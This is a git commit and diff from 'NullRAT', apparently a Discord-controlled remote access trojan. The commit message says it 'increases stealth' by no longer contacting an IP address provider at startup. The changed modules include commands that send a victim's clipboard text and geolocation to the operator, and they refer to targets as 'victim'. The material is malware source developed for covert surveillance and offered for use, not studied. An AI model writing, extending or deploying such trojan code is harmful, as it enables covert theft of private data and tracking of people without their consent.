12cde712600770a3faa28c46c4d55d5a8a4374b2
NullCode1337 <contact.nullcode@proton.me>
2025-07-27 10:03:06 +0600

    NullRAT: Increase stealth
    Do not contact IP Address provider immediately on startup, instead using a random number based identification code
    Should've noticed this beforehand honestly lmao

--- NullRAT/modules/clipboard.py
+++ NullRAT/modules/clipboard.py
@@ -8,8 +8,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class GetClipboard(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
-        
+                
     @commands.slash_command( )
     async def get_clipboard(self, ctx, victim):
         """Sends current text stored in user clipboard
--- NullRAT/modules/geolocate.py
+++ NullRAT/modules/geolocate.py
@@ -8,8 +8,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 class Geolocate(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
-        self.ip_addr = self.bot.ip_addr
-        
+                
     @commands.slash_command( )
     async def get_geolocation(self, ctx, victim):
         """Finds all geolocation information of victim
